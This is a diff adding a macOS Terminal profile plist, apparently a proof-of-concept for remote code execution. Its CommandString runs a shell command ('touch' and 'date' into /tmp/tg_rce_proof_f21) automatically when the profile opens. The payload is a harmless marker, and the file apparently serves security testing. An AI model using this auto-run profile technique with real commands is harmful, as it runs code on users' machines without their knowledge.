@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>CommandString</key>
+    <string>touch /tmp/tg_rce_proof_f21 ; date >> /tmp/tg_rce_proof_f21</string>
+    <key>RunCommandAsShell</key>
+    <true/>
+    <key>name</key>
+    <string>DefaultProfile</string>
+    <key>type</key>
+    <string>Window Settings</string>
+</dict>
+</plist>
